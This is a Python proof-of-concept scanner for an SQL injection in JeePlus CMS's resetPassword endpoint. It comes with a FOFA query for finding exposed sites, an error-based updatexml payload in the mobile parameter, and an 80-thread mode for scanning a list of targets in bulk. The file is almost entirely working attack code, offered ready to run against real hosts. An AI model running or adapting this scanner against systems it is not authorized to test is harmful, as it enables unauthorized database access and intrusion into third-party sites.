#fofa：(body="jeeplus.js" && body="/static/common/") || title="JeePlus 快速开发平台"
#导包
import requests,sys,argparse
from multiprocessing.dummy import Pool
#关闭警告
requests.packages.urllib3.disable_warnings()
#横幅
def banner():
    test = """
     _                 _              _____ __  __  _____             _   _       _           _   
    (_)               | |            / ____|  \/  |/ ____|           | | (_)     (_)         | |  
     _  ___  ___ _ __ | |_   _ ___  | |    | \  / | (___    ___  __ _| |  _ _ __  _  ___  ___| |_ 
    | |/ _ \/ _ \ '_ \| | | | / __| | |    | |\/| |\___ \  / __|/ _` | | | | '_ \| |/ _ \/ __| __|
    | |  __/  __/ |_) | | |_| \__ \ | |____| |  | |____) | \__ \ (_| | | | | | | | |  __/ (__| |_ 
    | |\___|\___| .__/|_|\__,_|___/  \_____|_|  |_|_____/  |___/\__, |_| |_|_| |_| |\___|\___|\__|
   _/ |         | |                                                | |          _/ |              
  |__/          |_|                                                |_|         |__/               


"""
    print(test)
#主函数
def main():
    banner()
    parser = argparse.ArgumentParser(description="jeeplus CMS resetpassword SQL注入漏洞")
    parser.add_argument('-u','--url',dest='url',type=str,help='input your url')
    parser.add_argument('-f','--file',dest='file',type=str,help='Please Input File')
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list=[]
        with open(args.file,'r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip())
        pool = Pool(80)
        pool.map(poc,url_list)
        pool.close()
        pool.join()
    else:
        print(f"Usage:\n\t python3 {sys.argv[0]} -h")

#poc函数
def poc(target):
    payload = '/a/sys/user/resetPassword?mobile=13588888888%27and%20(updatexml(1,concat(0x7e,(select%20md5(123456)),0x7e),1))%23'
    headers={
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.9 Safari/537.36',
    }
    proxes = {
        'http':'http://127.0.0.1:8080',
        'https':'http://127.0.0.1:8080'
    }
    try:
        res = requests.get(url=target+payload,headers=headers,verify=False)
        if '~e10adc3949ba59abbe56e057f20f883' in res.text:
            print(f'[+]{target}存在漏洞')
        else:
            print(f'[-]{target}不存在漏洞')
    except:
        print(target + '网站连接异常')

#函数入口
if __name__=="__main__":
    main()